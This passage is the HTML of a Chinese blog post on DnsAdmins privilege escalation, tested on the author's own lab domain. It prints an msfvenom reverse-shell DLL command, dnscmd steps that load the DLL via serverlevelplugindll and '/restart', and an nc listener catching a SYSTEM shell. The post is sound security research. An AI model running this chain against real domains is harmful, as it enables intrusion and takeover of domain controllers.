@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="本文所使用环境\r这篇环境当中，我使用的是我自建靶机bicker,其中tindalos就是dnsadmin组\n本文阅读前置介绍\rdnsadmin作为域渗透中的一个常见提权思路，网上的文章已经有很多了，但是普遍是你抄我我抄你，大部分都是一个模板套出来的，其原因也很简单,最容易枚举到的是nairuzabulhul的这篇博客，而那些“一般文章”普遍都是刻着它的模板，按照他们的解释来看，只要是dnsadmin组就允许执行以下操作进行提权\n利用dnscmd.exe给dns的组件serverlevelplugindll注册恶意后门dll 监听shell 利用sc.exe重启服务，在服务重启的时候dns会加载恶意dll并回弹system权限shell 当然，在准备详细研究之前我也是这么觉得的，但是当我们真正配置了一个dnsadmin组则会发现dnsadmin组其实默认并不具备重启服务的权限\nevil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; whoami /all 用户信息 ---------------- 用户名 SID =============== ============================================ bicker\\tindalos S-1-5-21-298176814-2846777796-698167141-1103 组信息 ----------------- 组名 类型 SID 属性 =========================================== ====== ============================================ ====================================== Everyone 已知组 S-1-1-0 必需的组, 启用于默认, 启用的组 BUILTIN\\Remote Desktop Users 别名 S-1-5-32-555 必需的组, 启用于默认, 启用的组 BUILTIN\\Remote Management Users 别名 S-1-5-32-580 必需的组, 启用于默认, 启用的组 BUILTIN\\Users 别名 S-1-5-32-545 必需的组, 启用于默认, 启用的组 BUILTIN\\Pre-Windows 2000 Compatible Access 别名 S-1-5-32-554 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\NETWORK 已知组 S-1-5-2 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\Authenticated Users 已知组 S-1-5-11 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\This Organization 已知组 S-1-5-15 必需的组, 启用于默认, 启用的组 BICKER\\DnsAdmins 别名 S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用的组, 本地组 NT AUTHORITY\\NTLM Authentication 已知组 S-1-5-64-10 必需的组, 启用于默认, 启用的组 Mandatory Label\\Medium Plus Mandatory Level 标签 S-1-16-8448 特权信息 ---------------------- 特权名 描述 状态 ============================= ================ ====== SeMachineAccountPrivilege 将工作站添加到域 已启用 SeChangeNotifyPrivilege 绕过遍历检查 已启用 SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用 用户声明信息 ----------------------- 用户声明未知。 已在此设备上禁用对动态访问控制的 Kerberos 支持。 evil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; sc.exe stop dns [SC] OpenService 失败 5: 拒绝访问。 evil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; 这意味着如果进入实战环境或者远程靶机环境，没有配置服务管理权限的dnsadmin将很难利用（无重启特权）\n">
+<title>Origins-wp</title>
+
+<link rel='canonical' href='https://wackymaker.github.io/post/dnsadmin/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="Origins-wp">
+<meta property='og:description' content="本文所使用环境\r这篇环境当中，我使用的是我自建靶机bicker,其中tindalos就是dnsadmin组\n本文阅读前置介绍\rdnsadmin作为域渗透中的一个常见提权思路，网上的文章已经有很多了，但是普遍是你抄我我抄你，大部分都是一个模板套出来的，其原因也很简单,最容易枚举到的是nairuzabulhul的这篇博客，而那些“一般文章”普遍都是刻着它的模板，按照他们的解释来看，只要是dnsadmin组就允许执行以下操作进行提权\n利用dnscmd.exe给dns的组件serverlevelplugindll注册恶意后门dll 监听shell 利用sc.exe重启服务，在服务重启的时候dns会加载恶意dll并回弹system权限shell 当然，在准备详细研究之前我也是这么觉得的，但是当我们真正配置了一个dnsadmin组则会发现dnsadmin组其实默认并不具备重启服务的权限\nevil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; whoami /all 用户信息 ---------------- 用户名 SID =============== ============================================ bicker\\tindalos S-1-5-21-298176814-2846777796-698167141-1103 组信息 ----------------- 组名 类型 SID 属性 =========================================== ====== ============================================ ====================================== Everyone 已知组 S-1-1-0 必需的组, 启用于默认, 启用的组 BUILTIN\\Remote Desktop Users 别名 S-1-5-32-555 必需的组, 启用于默认, 启用的组 BUILTIN\\Remote Management Users 别名 S-1-5-32-580 必需的组, 启用于默认, 启用的组 BUILTIN\\Users 别名 S-1-5-32-545 必需的组, 启用于默认, 启用的组 BUILTIN\\Pre-Windows 2000 Compatible Access 别名 S-1-5-32-554 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\NETWORK 已知组 S-1-5-2 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\Authenticated Users 已知组 S-1-5-11 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\This Organization 已知组 S-1-5-15 必需的组, 启用于默认, 启用的组 BICKER\\DnsAdmins 别名 S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用的组, 本地组 NT AUTHORITY\\NTLM Authentication 已知组 S-1-5-64-10 必需的组, 启用于默认, 启用的组 Mandatory Label\\Medium Plus Mandatory Level 标签 S-1-16-8448 特权信息 ---------------------- 特权名 描述 状态 ============================= ================ ====== SeMachineAccountPrivilege 将工作站添加到域 已启用 SeChangeNotifyPrivilege 绕过遍历检查 已启用 SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用 用户声明信息 ----------------------- 用户声明未知。 已在此设备上禁用对动态访问控制的 Kerberos 支持。 evil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; sc.exe stop dns [SC] OpenService 失败 5: 拒绝访问。 evil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; 这意味着如果进入实战环境或者远程靶机环境，没有配置服务管理权限的dnsadmin将很难利用（无重启特权）\n">
+<meta property='og:url' content='https://wackymaker.github.io/post/dnsadmin/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-08-25T18:50:52&#43;08:00'/><meta property='article:modified_time' content='2025-08-25T18:50:52&#43;08:00'/>
+<meta name="twitter:title" content="Origins-wp">
+<meta name="twitter:description" content="本文所使用环境\r这篇环境当中，我使用的是我自建靶机bicker,其中tindalos就是dnsadmin组\n本文阅读前置介绍\rdnsadmin作为域渗透中的一个常见提权思路，网上的文章已经有很多了，但是普遍是你抄我我抄你，大部分都是一个模板套出来的，其原因也很简单,最容易枚举到的是nairuzabulhul的这篇博客，而那些“一般文章”普遍都是刻着它的模板，按照他们的解释来看，只要是dnsadmin组就允许执行以下操作进行提权\n利用dnscmd.exe给dns的组件serverlevelplugindll注册恶意后门dll 监听shell 利用sc.exe重启服务，在服务重启的时候dns会加载恶意dll并回弹system权限shell 当然，在准备详细研究之前我也是这么觉得的，但是当我们真正配置了一个dnsadmin组则会发现dnsadmin组其实默认并不具备重启服务的权限\nevil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; whoami /all 用户信息 ---------------- 用户名 SID =============== ============================================ bicker\\tindalos S-1-5-21-298176814-2846777796-698167141-1103 组信息 ----------------- 组名 类型 SID 属性 =========================================== ====== ============================================ ====================================== Everyone 已知组 S-1-1-0 必需的组, 启用于默认, 启用的组 BUILTIN\\Remote Desktop Users 别名 S-1-5-32-555 必需的组, 启用于默认, 启用的组 BUILTIN\\Remote Management Users 别名 S-1-5-32-580 必需的组, 启用于默认, 启用的组 BUILTIN\\Users 别名 S-1-5-32-545 必需的组, 启用于默认, 启用的组 BUILTIN\\Pre-Windows 2000 Compatible Access 别名 S-1-5-32-554 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\NETWORK 已知组 S-1-5-2 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\Authenticated Users 已知组 S-1-5-11 必需的组, 启用于默认, 启用的组 NT AUTHORITY\\This Organization 已知组 S-1-5-15 必需的组, 启用于默认, 启用的组 BICKER\\DnsAdmins 别名 S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用的组, 本地组 NT AUTHORITY\\NTLM Authentication 已知组 S-1-5-64-10 必需的组, 启用于默认, 启用的组 Mandatory Label\\Medium Plus Mandatory Level 标签 S-1-16-8448 特权信息 ---------------------- 特权名 描述 状态 ============================= ================ ====== SeMachineAccountPrivilege 将工作站添加到域 已启用 SeChangeNotifyPrivilege 绕过遍历检查 已启用 SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用 用户声明信息 ----------------------- 用户声明未知。 已在此设备上禁用对动态访问控制的 Kerberos 支持。 evil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; sc.exe stop dns [SC] OpenService 失败 5: 拒绝访问。 evil-winrm-py PS C:\\Users\\tindalos\\Documents&gt; 这意味着如果进入实战环境或者远程靶机环境，没有配置服务管理权限的dnsadmin将很难利用（无重启特权）\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#本文所使用环境">本文所使用环境</a></li>
+    <li><a href="#本文阅读前置介绍">本文阅读前置介绍</a></li>
+    <li><a href="#dnsadmin热重载">dnsadmin热重载</a></li>
+    <li><a href="#dnsadmin组权限解析及结论">dnsadmin组权限解析及结论</a></li>
+    <li><a href="#攻击路径检测难度">攻击路径检测难度</a></li>
+    <li><a href="#restart优点和缺点">/restart优点和缺点</a></li>
+    <li><a href="#感谢">感谢</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" >
+                域渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/dnsadmin/">Origins-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 25, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="本文所使用环境">本文所使用环境
+</h2><p>这篇环境当中，我使用的是我自建靶机<a class="link" href="https://www.wackymaker.com/post/bicher-%E8%87%AA%E5%BB%BA/"  target="_blank" rel="noopener"
+    >bicker</a>,其中tindalos就是dnsadmin组</p>
+<h2 id="本文阅读前置介绍">本文阅读前置介绍
+</h2><p>dnsadmin作为域渗透中的一个常见提权思路，网上的文章已经有很多了，但是普遍是你抄我我抄你，大部分都是一个模板套出来的，其原因也很简单,最容易枚举到的是<a class="link" href="https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b"  target="_blank" rel="noopener"
+    >nairuzabulhul</a>的这篇博客，而那些“一般文章”普遍都是刻着它的模板，按照他们的解释来看，只要是dnsadmin组就允许执行以下操作进行提权</p>
+<ol>
+<li>利用dnscmd.exe给dns的组件serverlevelplugindll注册恶意后门dll</li>
+<li>监听shell</li>
+<li>利用sc.exe重启服务，在服务重启的时候dns会加载恶意dll并回弹system权限shell</li>
+</ol>
+<p>当然，在准备详细研究之前我也是这么觉得的，但是当我们真正配置了一个dnsadmin组则会发现dnsadmin组其实默认并不具备重启服务的权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>用户信息
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>用户名          SID                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span> <span style="color:#f92672">============================================</span>
+</span></span><span style="display:flex;"><span>bicker<span style="color:#ae81ff">\t</span>indalos S-1-5-21-298176814-2846777796-698167141-1103
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>组信息
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>组名                                        类型   SID                                          属性                                  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===========================================</span> <span style="color:#f92672">======</span> <span style="color:#f92672">============================================</span> <span style="color:#f92672">======================================</span>
+</span></span><span style="display:flex;"><span>Everyone                                    已知组 S-1-1-0                                      必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Desktop Users                别名   S-1-5-32-555                                 必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users             别名   S-1-5-32-580                                 必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                               别名   S-1-5-32-545                                 必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access  别名   S-1-5-32-554                                 必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                        已知组 S-1-5-2                                      必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users            已知组 S-1-5-11                                     必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization              已知组 S-1-5-15                                     必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>BICKER<span style="color:#ae81ff">\D</span>nsAdmins                            别名   S-1-5-21-298176814-2846777796-698167141-1101 必需的组, 启用于默认, 启用的组, 本地组
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication            已知组 S-1-5-64-10                                  必需的组, 启用于默认, 启用的组        
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\M</span>edium Plus Mandatory Level 标签   S-1-16-8448                                                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>特权信息
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>特权名                        描述             状态  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">======</span>
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     将工作站添加到域 已启用
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       绕过遍历检查     已启用
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>用户声明信息
+</span></span><span style="display:flex;"><span>-----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>用户声明未知。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>已在此设备上禁用对动态访问控制的 Kerberos 支持。
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\D</span>ocuments&gt; sc.exe stop dns
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SC<span style="color:#f92672">]</span> OpenService 失败 5:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>拒绝访问。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\t</span>indalos<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>这意味着如果进入实战环境或者远程靶机环境，没有配置服务管理权限的dnsadmin将很难利用（无重启特权）</p>
+<h2 id="dnsadmin热重载">dnsadmin热重载
+</h2><p>为了找寻如何在仅仅使用dnsadmin组权限进行服务重启类似效果时，我查看了<a class="link" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/f97756c9-3783-428b-9451-b376f877319a"  target="_blank" rel="noopener"
+    >MS-DNSP</a>的文档，我查找到了这一行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>§If pszOperation is Restart, the server MUST restart the DNS server, and <span style="color:#66d9ef">return</span> success.
+</span></span></code></pre></div><p>文档中显示的结果就是服务器在R_DnssrvOperation中接受的命令有restart这个值，也意味着确实存在重启选项</p>
+<p>于是我查看dnscmd<a class="link" href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd"  target="_blank" rel="noopener"
+    >dnscmd</a>的文档，但是当我搜索restart的时候一无所获，走头无路的我找到了<a class="link" href="https://www.semperis.com/blog/dnsadmins-revisited/"  target="_blank" rel="noopener"
+    >Yuval Gordon</a>的文章(事实上后续的研究我参考了他很多，感谢前人)，发现他找到了dnscmd存在/restart参数，当我尝试后，它真的成功了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e">#这里我使用的rev.dll为：msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.174.129 LPORT=443 -f dll -o rev.dll</span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\t</span>indalos&gt; dnscmd.exe /config /serverlevelplugindll C:<span style="color:#ae81ff">\w</span>irteTEMP<span style="color:#ae81ff">\r</span>ev.dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>注册属性 serverlevelplugindll 成功重置。
+</span></span><span style="display:flex;"><span>命令成功完成。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\t</span>indalos&gt; dnscmd.exe /restart
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>. 已成功完成。
+</span></span><span style="display:flex;"><span>命令成功完成。
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>192.168.174.129<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.174.143<span style="color:#f92672">]</span> <span style="color:#ae81ff">54728</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>°汾 10.0.20348.169<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation¡£±£´̹ԐȨ<span style="color:#f92672">{</span>¡£
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;
+</span></span></code></pre></div><p>这令我有点意外，因为我不理解为何它能重启服务，并且它并不在微软的文档当中，于是我对dnsadmin以及dnscmd的使用进行了研究</p>
+<p>这种不利用sc执行的攻击类似于热重载，其本质上与服务重启的含义并不同，导致的效果也并不同，如果你对这块内容感兴趣，可以跳到本文章的 /restart优点和缺点</p>
+<h2 id="dnsadmin组权限解析及结论">dnsadmin组权限解析及结论
+</h2><p>我们登陆环境当中的域管理并筛选dnsadmin对MicrosoftDNS容器的控制权限可以看到基本上就是通用all权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>dsacls <span style="color:#e6db74">&#34;CN=MicrosoftDNS,CN=System,DC=bicker,DC=com&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>允许 BICKER<span style="color:#ae81ff">\D</span>nsAdmins   特殊访问
+</span></span><span style="display:flex;"><span>    DELETE
+</span></span><span style="display:flex;"><span>    READ PERMISSONS
+</span></span><span style="display:flex;"><span>    WRITE PERMISSIONS
+</span></span><span style="display:flex;"><span>    CHANGE OWNERSHIP
+</span></span><span style="display:flex;"><span>    CREATE CHILD
+</span></span><span style="display:flex;"><span>    DELETE CHILD
+</span></span><span style="display:flex;"><span>    LIST CONTENTS
+</span></span><span style="display:flex;"><span>    WRITE SELF
+</span></span><span style="display:flex;"><span>    WRITE PROPERTY
+</span></span><span style="display:flex;"><span>    READ PROPERTY
+</span></span><span style="display:flex;"><span>    DELETE TREE
+</span></span><span style="display:flex;"><span>    CONTROL ACCESS
+</span></span></code></pre></div><p>我们尝试创建一个域用户且添加远程管理和对MicrosoftDNS的通用写入和读取</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; New-ADUser -Name <span style="color:#e6db74">&#34;dns-test&#34;</span> -SamAccountName <span style="color:#e6db74">&#34;dns-test&#34;</span> -AccountPassword <span style="color:#f92672">(</span>ConvertTo-S
+</span></span><span style="display:flex;"><span>ecureString <span style="color:#e6db74">&#34;P@ssw0rd!&#34;</span> -AsPlainText -Force<span style="color:#f92672">)</span> -Enabled $true
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;Remote Management Users&#34;</span> -Members <span style="color:#e6db74">&#34;dns-test&#34;</span>
+</span></span><span style="display:flex;"><span>evil-winrm-py PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; dsacls <span style="color:#e6db74">&#34;CN=MicrosoftDNS,CN=System,DC=bicker,DC=com&#34;</span> /G <span style="color:#e6db74">&#34;BICKER\dns-test:GRGW&#34;</span>
